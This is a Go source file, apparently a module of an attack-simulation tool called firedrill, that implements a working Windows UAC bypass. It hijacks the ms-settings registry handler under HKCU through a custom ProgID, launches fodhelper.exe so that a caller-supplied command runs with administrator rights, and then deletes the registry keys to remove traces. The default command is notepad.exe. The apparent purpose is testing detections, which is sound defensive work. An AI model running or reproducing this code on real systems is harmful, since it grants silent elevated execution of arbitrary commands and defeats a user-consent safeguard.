package bypass_fodhelper

import (
	"context"
	"fmt"
	"os/exec"

	"github.com/FourCoreLabs/firedrill/pkg/sergeant"
	"go.uber.org/zap"
	"golang.org/x/sys/windows/registry"
)

const (
	ID          = "bypass_fodhelper"
	Name        = "Fodhelper UAC Bypass"
	progID      = `Software\Classes\.FDL\Shell\Open\command`
	msPath      = `Software\Classes\ms-settings\CurVer`
	clearMsPath = `Software\Classes\ms-settings\`
	clearProgID = `Software\Classes\.FDL\Shell\Open`
	pid         = `.FDL`
)

type BypassFodhelperOptions struct {
	Command string
}

type BypassFodhelper struct {
	command string
}

func NewBypassFodhelper(opts ...BypassFodhelperOptions) sergeant.Runnable {
	var options BypassFodhelperOptions = BypassFodhelperOptions{
		Command: "notepad.exe",
	}
	if len(opts) > 0 {
		options = opts[0]
	}

	return &BypassFodhelper{command: options.Command}
}

func (e *BypassFodhelper) ID() string {
	return ID
}

func (e *BypassFodhelper) Name() string {
	return Name
}

func (e *BypassFodhelper) Run(ctx context.Context, logger *zap.Logger) error {
	sugared := logger.Sugar()

	sugared.Info("Performing UAC Bypass using fodhelper.exe")

	// Setting up the registry format to create the bypass
	command := fmt.Sprintf("cmd.exe /c start %s", e.command)

	sugared.Infof("Command to be executed: %s", command)

	if err := CreateRegistryKeyCU(progID); err != nil {
		return err
	}

	pKey, err := registry.OpenKey(registry.CURRENT_USER, progID, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		return err
	}

	if err := pKey.SetStringValue("", command); err != nil {
		pKey.Close()
		return err
	}
	pKey.Close()

	CreateRegistryKeyCU(msPath)

	mKey, err := registry.OpenKey(registry.CURRENT_USER, msPath, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		return err
	}

	err = mKey.SetStringValue("", pid)
	if err != nil {
		mKey.Close()
		return err
	}
	mKey.Close()

	sugared.Info("Fodhelper UAC Bypassed using Programmable Identifiers")

	_, err = exec.Command("cmd", "/C", "C:\\Windows\\System32\\fodhelper.exe").Output()
	if err != nil {
		return err
	}

	sugared.Info("Command executed using cmd.exe with admin privileges")

	sugared.Info("Cleaning up registry after successful UAC Bypass.")

	if err := DeleteRegistryKeyCU(clearMsPath, "CurVer"); err != nil {
		sugared.Infof("faild to delete CurVer key: %s", err.Error())
	}
	if err := DeleteRegistryKeyCU(clearProgID, "Command"); err != nil {
		sugared.Infof("faild to delete Command key: %s", err.Error())
	}

	return nil
}

func CreateRegistryKeyCU(keyPath string) error {
	_, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		return err
	}

	return nil
}

func DeleteRegistryKeyCU(keyPath, keyName string) error {
	key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer key.Close()

	err = registry.DeleteKey(key, keyName)
	if err != nil {
		return err
	}
	return nil
}
